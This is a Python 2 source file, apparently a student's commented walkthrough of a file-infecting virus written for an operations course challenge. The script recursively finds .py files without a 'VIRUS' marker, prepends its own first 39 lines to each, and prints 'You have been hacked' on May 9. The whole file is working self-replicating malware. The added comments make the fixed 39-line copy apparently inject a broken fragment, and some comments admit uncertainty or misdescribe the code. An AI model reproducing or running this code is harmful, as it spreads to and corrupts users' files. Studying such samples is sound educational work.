#!/usr/bin/python
# Script:                       Ops 301 Challenge 14
# Translator:                   Jose Cardozo
# Date of latest revision:      01/02/2023
# Purpose:                      Reading and Explaining 


# imports the os module
import os
# imports all the content from the datetime module
import datetime

# Creating a variable called "Signature" with the value "Virus"
SIGNATURE = "VIRUS"

# Defining the function "locate"
def locate(path):
  
  # Variable called "files_targeted" with the value "[]"
    files_targeted = []
    
    # Variable called "files_targeted" with the value "os.listdir(path)"
    filelist = os.listdir(path)
    
    # This will look at every file and directory in the "filelist"
    for fname in filelist:
      
      # Asking if "fname" is a directory
        if os.path.isdir(path+"/"+fname):
          
          # NOT SURE YET
            files_targeted.extend(locate(path+"/"+fname))
            
            # Else if the last 3 characters of "fname" are equal to ".py" then continue to the next line
        elif fname[-3:] == ".py":
         
        # variable called "infected" with the value of "False"
            infected = False
            
            # For "line" it opens a file and reads each line
            for line in open(path+"/"+fname):
              
              # If variable "SIGNATURE" then continue to the next line
                if SIGNATURE in line:
                 
                # This is changing the variable "Infected" from False to "True"
                    infected = True
                  
                  # Breaks out of the forloop
                    break
                    
                    # if the variable "infected" then continue to the next line
            if infected == False:
              
              # This will add "path + fname" to "files_targeted"
                files_targeted.append(path+"/"+fname)
           
          # This saves this variable to use it later     
    return files_targeted

  # This creates a function called "infect"
def infect(files_targeted):
    
    # This is a variable called "virus" with the value of "open(os.path.abspath(__file__))" which opens a file path
    virus = open(os.path.abspath(__file__))
    
    # This is an empty variable
    virusstring = ""
    
    # This is a enumerate funcion
    for i,line in enumerate(virus):
        if 0 <= i < 39:
          
          # This is a variable called "virusstring" with the value of "line". Maybe two variables?
            virusstring += line
    virus.close
    
    # This is a loop that finds, reads, creates and closes files
    for fname in files_targeted:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()

 # This is a function that if the date is May 9th than it will print "You have been hacked"       
def detonate():
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        print "You have been hacked"

# This will find the path to the files and infect the files targeted
files_targeted = locate(os.path.abspath(""))
infect(files_targeted)
detonate()
